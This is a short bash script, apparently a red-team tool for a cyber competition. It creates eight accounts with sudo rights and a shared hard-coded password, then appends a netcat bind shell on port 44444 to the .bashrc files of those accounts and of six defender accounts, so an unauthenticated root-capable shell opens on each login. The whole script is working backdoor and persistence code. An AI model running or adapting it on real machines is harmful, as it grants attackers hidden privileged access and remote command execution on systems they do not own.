#!/bin/bash

# EVIL SPELLBOOK
# Author: Caroline Richards

# This script does a few miscellaneous things I wanted to have in place for the competition. 
# This includes creating users and starting reverse shells that will spawn on bash login. 

usernames=("caroline" "denna" "kvothe" "bast" "auri" "ambrose" "elodin" "fela")

for username in "${usernames[@]}"; do
    # Create red team users
    if id "$username" &>/dev/null; then
        echo "User $username already exists, skipping creation."
    else
        useradd -m -s /bin/bash "$username"
        # make user admin
        usermod -aG sudo "$username"
    fi
    # Set passwords for red team users
    echo "$username:aTerg0Lupi!" | chpasswd
    # Spawn reverse shell in each user's bash profile
    touch "/home/$username/.bashrc"
    ip=$(hostname -I | awk '{print $1}')
    echo "nc.traditional -lvnp 44444 -e /bin/bash >/dev/null 2>&1 &" &>> "/home/$username/.bashrc"
    chown "$username:$username" "/home/$username/.bashrc"
done

blueusers=("king" "duke" "knight" "lady" "baron" "scribe")
for user in "${blueusers[@]}"; do
    touch "/home/$user/.bashrc"
    ip=$(hostname -I | awk '{print $1}')
    echo "nc.traditional -lvnp 44444 -e /bin/bash >/dev/null 2>&1 &" &>> "/home/$user/.bashrc"
    chown "$user:$user" "/home/$user/.bashrc"
done